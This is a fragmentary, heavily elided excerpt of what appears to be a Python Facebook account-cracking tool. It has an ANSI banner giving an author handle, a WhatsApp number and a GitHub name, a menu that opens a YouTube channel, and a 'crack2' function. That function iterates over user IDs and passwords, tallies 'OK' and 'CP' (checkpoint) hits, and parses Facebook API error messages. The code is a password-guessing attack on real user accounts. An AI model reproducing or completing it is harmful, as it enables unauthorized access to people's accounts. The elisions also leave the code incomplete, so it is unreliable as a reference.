...
\x1b[92;1m===================================>\x1b[92;1m
\x1b[93;1m Authur       \x1b[92;1m=>         \x1b[93;1mS H R
\x1b[93;1m Whatsp       \x1b[92;1m=>        \x1b[93;1m+8801982876336
\x1b[93;1m Github       \x1b[92;1m=>         \x1b[93;1mrafu404-cyber
\x1b[92;1m===================================>\x1b[92;1m
"""%(h))
...
def menu(): #RAFU
	...
	if farhan in ['1','01']:
		...
		os.system("xdg-open https://youtube.com/channel/UCZL_Wjboqc4BOSSdHz7SjIQ")
		exit()
	else:
		os.system("https://youtube.com/channel/UCZL_Wjboqc4BOSSdHz7SjIQ")
		exit()
...
def crack2(idf,pwv):
	...
	fff = '%'
	print('\r%s [RAFU] %s/%s  OK*%s | CP*%s => %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
		...
		try:
			...
			if "www.facebook.com" in resp.json()["error_msg"]:
				if 'ya' in oprek:
					...
					print('\r%s [RAFU-CP😭] %s|%s        '%(b,idf,pw))
